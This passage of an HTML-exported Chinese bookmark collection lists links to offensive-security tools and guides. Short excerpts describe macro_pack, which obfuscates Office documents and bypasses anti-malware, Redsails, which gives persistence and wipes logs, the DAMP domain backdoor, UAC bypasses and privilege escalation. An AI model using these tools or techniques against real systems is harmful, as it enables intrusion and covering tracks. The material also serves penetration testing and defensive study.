BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">macro_pack是一个工具，用于自动化混淆和复制格式的生成，如MS Office文档或VBS格式。</font><font style="box-sizing: border-box; vertical-align: inherit;">现在它也处理各种快捷方式格式。</font></font><br clear="none" style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">此工具可用于重新命名，pentests，演示和社会工程评估。</font><font style="box-sizing: border-box; vertical-align: inherit;">macro_pack将简化反恶意软件解决方案，绕过并自动化从vba生成到最终Office文档生成的过程。</font></font><br clear="none" style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">使用非常简单：</font></font></p><ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; padding-left: 2em; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><li style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">没有配置</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">一切都可以使用一行代码来完成</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">生成大部分Office格式和基于VBS的格式</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">高级VBA宏攻击以及DDE攻击</font></font></li></ul><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">该工具与流行的pentest工具（Metasploit，Empire，…）生成的有效载荷兼容。</font><font style="box-sizing: border-box; vertical-align: inherit;">与其他工具结合也很容易，因为它可以从stdin读取输入并将输出安静地输出到另一个工具。</font><font style="box-sizing: border-box; vertical-align: inherit;">这个工具是用Python3编写的，可以在Linux和Windows平台上运行。</font></font></p><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><strong style="box-sizing: border-box; font-weight: 600;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">注意：</font></font></strong><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;"> Office文档自动生成或特洛伊木马功能需要安装安装了正确MS Office应用程序的Windows平台。</font></font></p></div></span><br></div><br><hr><br><a name="1464"><br><br><div><span><div><a href="https://github.com/BeetleChunks/redsails/blob/master/README.md" shape="rect" target="_blank" rel="noopener">https://github.com/BeetleChunks/redsails/blob/master/README.md</a></div><div><h1 style="box-sizing: border-box; margin-top: 0px !important; margin-bottom: 16px; font-weight: 600; padding-bottom: 0.3em; font-size: 2em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Redsails</font></font></h1><h2 style="box-sizing: border-box; margin-top: 24px; margin-bottom: 16px; font-weight: 600; padding-bottom: 0.3em; font-size: 1.5em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><a href="https://github.com/BeetleChunks/redsails/blob/master/README.md#about" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none; float: left; padding-right: 4px; margin-left: -20px;" target="_blank" rel="noopener"></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">关于</font></font></h2><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">后期开发工具能够：</font></font></p><ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; padding-left: 2em; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><li style="box-sizing: border-box;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">在受损机器上保持持久性</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">破坏许多常见的主机事件日志（包括网络和帐户登录）</font></font></li><li style="box-sizing: border-box; margin-top: 0.25em;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">生成虚假日志/网络流量</font></font></li></ul><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">基于[PyDivert]（</font></font><a href="https://github.com/ffalcinelli/pydivert" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none;" target="_blank" rel="noopener"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">https://github.com/ffalcinelli/pydivert</font></font></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">），一种</font></font><a href="https://www.reqrypt.org/windivert.html" rel="noopener" shape="rect" style="box-sizing: border-box; color: rgb(3, 102, 214); text-decoration: none;" target="_blank"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">WinDivert</font></font></a><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">的Python绑定</font><font style="box-sizing: border-box; vertical-align: inherit;">，Windows驱动程序允许用户模式应用程序捕获/修改/丢弃发送到/从Windows网络堆栈发送的网络数据包。</font></font></p><p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(250, 251, 252); text-decoration-style: initial; text-decoration-color: initial;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">适用于比Vista和Windows 2008（包括Windows 7，Windows 8和Windows 10）更新的Windows操作系统。</font></font></p></div></span><br></div><br><hr><br><a name="1467"><br><br><div><span><div><a href="https://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">https://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</a></div></span><br></div><br><hr><br><a name="1519"><br><br><div><br><span><div>https://0day.today</div></span><br></div><br><hr><br><a name="1520"><br><br><div><span><div><a href="http://mp.weixin.qq.com/s/eaYpGBAGXWbvOW0JWcTL4w" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/eaYpGBAGXWbvOW0JWcTL4w</a></div></span><br></div><br><hr><br><a name="1521"><br><br><div><span><div><a href="https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/" target="_blank" rel="noopener">https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/</a></div></span><br></div><br><hr><br><a name="1539"><br><br><div><br><span><div><a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db</a></div></span><br></div><br><hr><br><a name="1593"><br><br><div><span><div>exp&quot;😢<a href="https://github.com/preempt/credssp" target="_blank" rel="noopener">https://github.com/preempt/credssp</a>&quot;</div></span><br></div><br><hr><br><a name="1594"><br><br><div><span><div><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">https://github.com/HarmJ0y/DAMP</a></div><div>利用视频:<a href="https://www.youtube.com/watch?v=-ZMCjxCl_CE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-ZMCjxCl_CE</a></div><div><br></div><div><br></div><div>描述:昨天那个工具DAMP 是用于域权限维持的后门，是利用域策略的逻辑漏洞， 用域管的权限添加注册表把一个当前普通域用户的key添加到目标服务器，然后可以随时远程访问目标服务器，</div></span><br></div><br><hr><br><a name="1602"><br><br><div><span><div><br></div><div>https://xz.aliyun.com/t/2128</div></span><br></div><br><hr><br><a name="1603"><br><br><div><span><div><br></div><div>https://xz.aliyun.com/t/2144</div></span><br></div><br><hr><br><a name="1606"><br><br><div><span><div><a href="https://github.com/1N3/Sn1per/blob/master/README.md" target="_blank" rel="noopener">https://github.com/1N3/Sn1per/blob/master/README.md</a></div><div>值得使用</div></span><br></div><br><hr><br><a name="1609"><br><br><div><span><div><a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">https://github.com/WhaleShark-Team/cobra</a></div></span><br></div><br><hr><br><a name="1646"><br><br><div><br><span><div><h1 style="box-sizing: border-box; font-size: 2em; margin-top: 0px !important; margin-right: 0px; margin-bottom: 16px; margin-left: 0px; font-weight: bold; line-height: 1.25; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; font-size: 2em; font-weight: bold; line-height: 1.25; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><a href="https://github.com/enkomio/RunDotNetDll" style="font-weight: bold; font-size: 39pt; color: rgb(36, 41, 46);" target="_blank" rel="noopener">https://github.com/enkomio/RunDotNetDll</a><br></span></h1><h1 style="box-sizing: border-box; font-size: 2em; margin-top: 0px !important; margin-right: 0px; margin-bottom: 16px; margin-left: 0px; font-weight: bold; line-height: 1.25; padding-bottom: 0.3em; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; font-size: 2em; font-weight: bold; line-height: 1.25; border-bottom: 1px solid rgb(234, 236, 239); color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">序集的所有方法并调用它们。</span></h1><div style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; font-style: italic;">RunDotNetDll</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">允许内省给定的.NET程序集，以列出在程序集中实现的所有方法并调用它们。</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">所有这一切都是通过纯粹的反思完成</span></div><div style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">我创建了这个实用程序，以便轻松分析在运行时加载其他.NET程序集的恶意.NET程序。</span><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">一旦你已经解压缩程序集，你需要一个意思来运行它，但如果它是一个DLL是不是那么容易。</span></div><div><span style="box-sizing: border-box; color: rgb(36, 41, 46); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;">使用RunDotNetDll，您可以调用给定Assembly的特定方法。</span></div><div><img src="Demon分享_files/test_run.gif" type="image/gif" data-filename="test_run.gif" style="font-size: 12pt; color: rgb(36, 41, 46);"></div><div><br></div></div></span><br></div><br><hr><br><a name="1650"><br><br><div><br><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: 0.544px; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><a href="http://hyp3rlinx.altervista.org/" target="_blank" rel="noopener">http://hyp3rlinx.altervista.org/</a></span></div></span><br></div><br><hr><br><a name="1652"><br><br><div><br><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: 0.544px; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><a href="https://github.com/Ice3man543/hawkeye" target="_blank" rel="noopener">https://github.com/Ice3man543/hawkeye</a></span></div></span><br></div><br><hr><br><a name="1664"><br><br><div><span><div><a href="https://github.com/txthinking/brook/blob/master/README.md#what-is-brook" target="_blank" rel="noopener">https://github.com/txthinking/brook/blob/master/README.md#what-is-brook</a></div></span><br></div><br><hr><br><a name="1665"><br><br><div><span><div><a href="https://github.com/jacobsoo/IoT-MalwareTracker" target="_blank" rel="noopener">https://github.com/jacobsoo/IoT-MalwareTracker</a></div></span><br></div><br><hr><br><a name="1667"><br><br><div><br><span><div><a href="https://github.com/ExpLife0011/awesome-windows-kernel-security-development" target="_blank" rel="noopener">https://github.com/ExpLife0011/awesome-windows-kernel-security-development</a></div><div><br></div><div><img src="Demon分享_files/Image.png" type="image/png" data-filename="Image.png"></div><div><br></div></span><br></div><br><hr><br><a name="1671"><br><br><div><br><span><div><a href="https://github.com/vulnersCom/nmap-vulners" target="_blank" rel="noopener">https://github.com/vulnersCom/nmap-vulners</a></div><div><br></div><div><img src="Demon分享_files/Image [1].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>命令： <span style="box-sizing: border-box; font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; word-wrap: normal; overflow: visible; line-height: 1.45; background-color: rgb(246, 248, 250); border-radius: 3px; color: rgb(36, 41, 46); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background: transparent; word-break: normal; white-space: pre; border: 0px;">nmap -sV –script vulners IP</span></div><div><br></div></span><br></div><br><hr><br><a name="1739"><br><br><div><br><span><div><a href="https://github.com/360-A-Team/EventCleaner" target="_blank" rel="noopener">https://github.com/360-A-Team/EventCleaner</a></div></span><br></div><br><hr><br><a name="1749"><br><br><div><br><span><div><a href="http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html</a></div></span><br></div><br><hr><br><a name="1773"><br><br><div><br><span><div><a href="https://xz.aliyun.com/t/2516" target="_blank" rel="noopener">https://xz.aliyun.com/t/2516</a></div></span><br></div><br><hr><br><a name="1775"><br><br><div><br><span><div><a href="https://mp.weixin.qq.com/s/gwtdAeBy6dKViiZJbgKMSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gwtdAeBy6dKViiZJbgKMSA</a></div></span><br></div><br><hr><br><a name="1779"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/juliourena/plaintext/tree/master/CSharp%20Tools/UAC%20Bypass</span></div></span><br></div><br><hr><br><a name="1780"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://gist.github.com/caseysmithrc/87f6572547f633f13a8482a0c91fb7b7</span></div></span><br></div><br><hr><br><a name="1800"><br><br><div><br><span><div><a href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></div><div><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></div></span><br></div><br><hr><br><a name="1804"><br><br><div><br><span><div><a href="https://github.com/endgameinc/xori" target="_blank" rel="noopener">https://github.com/endgameinc/xori</a></div></span><br></div><br><hr><br><a name="1806"><br><br><div><br><span><div><a href="https://github.com/archerysec/archerysec/releases" target="_blank" rel="noopener">https://github.com/archerysec/archerysec/releases</a></div></span><br></div><br><hr><br><a name="1820"><br><br><div><br><span><div><a href="https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5" target="_blank" rel="noopener">https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5</a></div></span><br></div><br><hr><br><a name="1824"><br><br><div><span><div><a href="https://hansesecure.de/slae-assignment-5-analyze-metasploit-payloads/" target="_blank" rel="noopener">https://hansesecure.de/slae-assignment-5-analyze-metasploit-payloads/</a></div></span><br></div><br><hr><br><a name="1829"><br><br><div><br><span><div><a href="https://docs.google.com/document/d/101EsKlu41ICdeE7mEv189SS8wMtcdXfRtua0ClYjP1M/edit#heading=h.pfjprjr9eymx" target="_blank" rel="noopener">https://docs.google.com/document/d/101EsKlu41ICdeE7mEv189SS8wMtcdXfRtua0ClYjP1M/edit#heading=h.pfjprjr9eymx</a></div></span><br></div><br><hr><br><a name="1891"><br><br><div><br><span><div><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></div></span><br></div><br><hr><br><a name="1893"><br><br><div><br><span><div><a href="http://url.cn/50LjDfs" target="_blank" rel="noopener">http://url.cn/50LjDfs</a></div></span><br></div><br><hr><br><a name="1895"><br><br><div><br><span><div><a href="http://vinc.top/category/sec_web/" target="_blank" rel="noopener">http://vinc.top/category/sec_web/</a></div></span><br></div><br><hr><br><a name="1909"><br><br><div><br><span><div><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md</a></div></span><br></div><br><hr><br><a name="1998"><br><br><div><br><span><div><a href="https://github.com/homjxi0e/PowerAvails" target="_blank" rel="noopener">https://github.com/homjxi0e/PowerAvails</a></div></span><br></div><br><hr><br><a name="2002"><br><br><div><span><div><a href="http://www.ggsec.cn/secist-shellcode.html" target="_blank" rel="noopener">http://www.ggsec.cn/secist-shellcode.html</a></div></span><br></div><br><hr><br><a name="2003"><br><br><div><span><div><a href="https://hackedu.io/vulnerabilities" target="_blank" rel="noopener">https://hackedu.io/vulnerabilities</a></div></span><br></div><br><hr><br><a name="2004"><br><br><div><span><div><a href="http://www.secist.com/archives/7096.html" target="_blank" 